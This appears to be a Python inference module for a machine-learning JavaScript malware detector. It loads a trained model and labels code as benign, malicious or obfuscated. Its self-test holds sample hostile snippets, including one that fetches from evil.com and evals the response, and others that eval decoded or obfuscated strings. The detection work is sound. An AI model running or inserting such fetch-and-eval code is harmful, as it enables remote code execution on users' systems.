"""
JavaScript Malware Model Inference Module

Loads trained model and performs predictions on JavaScript code.
"""

import os
import sys
import pickle
import numpy as np

# Add paths
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'preprocess'))
from feature_engineering import JSFeatureExtractor

# Try ONNX
try:
    import onnxruntime as ort
    ONNX_AVAILABLE = True
except ImportError:
    ONNX_AVAILABLE = False


class JSModelInference:
    """
    Performs inference using trained JS malware detection model.
    """
    
    def __init__(self, model_dir: str = None):
        """
        Initialize inference module.
        
        Args:
            model_dir: Directory containing model files
        """
        if model_dir is None:
            model_dir = os.path.join(
                os.path.dirname(__file__), '..', '..', 'models', 'js'
            )
        
        self.model_dir = model_dir
        self.model = None
        self.scaler = None
        self.feature_extractor = JSFeatureExtractor()
        self.use_onnx = False
        
        self._load_models()
    
    def _load_models(self) -> None:
        """Load model and scaler."""
        # Paths
        onnx_path = os.path.join(self.model_dir, 'js_model.onnx')
        pkl_path = os.path.join(self.model_dir, 'js_model.pkl')
        scaler_path = os.path.join(self.model_dir, 'js_scaler.pkl')
        
        # Load scaler
        if not os.path.exists(scaler_path):
            raise FileNotFoundError(
                f"Scaler not found: {scaler_path}\n"
                "Please train the model first: python training/train_js_model.py"
            )
        
        with open(scaler_path, 'rb') as f:
            self.scaler = pickle.load(f)
        
        # Try ONNX first
        if ONNX_AVAILABLE and os.path.exists(onnx_path):
            try:
                self.model = ort.InferenceSession(onnx_path)
                self.use_onnx = True
                print(f"✓ Loaded ONNX model: {onnx_path}")
            except Exception as e:
                print(f"⚠ ONNX load failed: {e}, using pickle...")
        
        # Fallback to pickle
        if self.model is None:
            if not os.path.exists(pkl_path):
                raise FileNotFoundError(
                    f"Model not found: {pkl_path}\n"
                    "Please train the model first: python training/train_js_model.py"
                )
            
            with open(pkl_path, 'rb') as f:
                self.model = pickle.load(f)
            print(f"✓ Loaded pickle model: {pkl_path}")
        
        print(f"✓ Loaded scaler: {scaler_path}")
    
    def predict(self, js_code: str) -> dict:
        """
        Predict if JavaScript code is malicious.
        
        Args:
            js_code: JavaScript code string
            
        Returns:
            Dictionary with prediction results
        """
        try:
            # Extract features
            features = self.feature_extractor.extract_features(js_code)
            feature_vector = np.array([list(features.values())], dtype=np.float32)
            
            # Scale
            feature_vector_scaled = self.scaler.transform(feature_vector).astype(np.float32)
            
            # Predict
            if self.use_onnx:
                input_name = self.model.get_inputs()[0].name
                label_name = self.model.get_outputs()[0].name
                proba_name = self.model.get_outputs()[1].name
                
                result = self.model.run(
                    [label_name, proba_name],
                    {input_name: feature_vector_scaled}
                )
                
                prediction = int(result[0][0])
                probabilities = result[1][0]
            else:
                prediction = self.model.predict(feature_vector_scaled)[0]
                probabilities = self.model.predict_proba(feature_vector_scaled)[0]
            
            # Determine label
            if prediction == 1:
                # Check obfuscation
                if features.get('obfuscation_score', 0) > 7:
                    label = 'obfuscated'
                else:
                    label = 'malicious_js'
            else:
                label = 'benign'
            
            malicious_score = float(probabilities[1])
            
            return {
                'score': malicious_score,
                'label': label,
                'status': 'ok',
                'confidence': float(probabilities[prediction]),
                'obfuscation_score': features.get('obfuscation_score', 0)
            }
            
        except Exception as e:
            return {
                'score': 0.5,
                'label': 'unknown',
                'status': 'error',
                'error': str(e),
                'confidence': 0.0,
                'obfuscation_score': 0.0
            }


if __name__ == "__main__":
    # Test inference
    print("="*70)
    print("  JAVASCRIPT MALWARE DETECTION - INFERENCE TEST")
    print("="*70)
    
    try:
        predictor = JSModelInference()
        print("\n✓ Model loaded successfully!\n")
    except Exception as e:
        print(f"❌ Failed to load model: {e}")
        print("\nPlease train the model first:")
        print("  cd backend/ml_js_model/training")
        print("  python train_js_model.py")
        sys.exit(1)
    
    # Test cases
    test_cases = [
        ("Benign code", "function hello() { console.log('Hello World'); }"),
        ("Malicious eval", "eval(atob('bWFsd2FyZQ=='));"),
        ("Obfuscated", "var _0x=['payload'];eval(String['fromCharCode'](109,97,108));"),
        ("Fetch malware", "fetch('http://evil.com/steal').then(r=>r.text()).then(eval);"),
    ]
    
    print("Testing predictions:")
    print("-" * 70)
    
    for name, js_code in test_cases:
        result = predictor.predict(js_code)
        
        emoji = "✅" if result['label'] == 'benign' else "⚠️"
        print(f"\n{emoji} {name}")
        print(f"   Label: {result['label']}")
        print(f"   Score: {result['score']:.4f}")
        print(f"   Confidence: {result['confidence']:.4f}")
        print(f"   Status: {result['status']}")
        if result.get('obfuscation_score'):
            print(f"   Obfuscation: {result['obfuscation_score']:.2f}/10")
    
    print("\n" + "="*70)
    print("Inference test complete!")
